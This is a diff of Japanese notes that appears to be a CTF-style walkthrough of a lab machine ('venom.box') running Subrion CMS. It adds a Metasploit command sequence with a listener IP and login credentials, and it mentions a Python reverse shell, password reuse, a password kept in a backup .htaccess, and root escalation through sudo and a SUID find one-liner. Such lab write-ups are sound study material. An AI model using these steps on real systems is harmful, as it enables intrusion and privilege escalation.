@@ -65,7 +65,17 @@
   - `$`が出る。対話型シェルにしようとしても失敗する。`id`を見るとwww-dataであることがわかる。
   - `$`のところでreverse-shellをする。pythonのでしかできない
 - (3)(追記) msfconsoleを使う
-  - `msfconsole -q`で`search subrion`でいつもみたいに使う
+
+```
+msfconsole -q
+search subrion
+set rhosts venom.box
+set lhost 192.168.56.104
+set username dora
+set password E7~1234
+run
+```
+
 - 対話型シェルにする
 - `ls -l /home`を見ると、ユーザはhostinger,nathanのみ
 - `su hostinger`で切り替える。パスワードもhostinger
@@ -82,7 +92,7 @@
   - `/var/www/html/subrion/backup/.htaccess`そこにパスワードがある
 - su nathan
 - `id`
-  - sudoがある`sudo bash -i`これでrootになれる
+  - sudoグループに属していることがわかる。これはsudoコマンドが使うことができる。つまり`sudo bash -i`でrootでbashを起動することができる。つまりrootになれる
 - SUID
   - find,pkexecがある
   - これでrootになる`find . -exec /bin/sh -p \; -quit` 
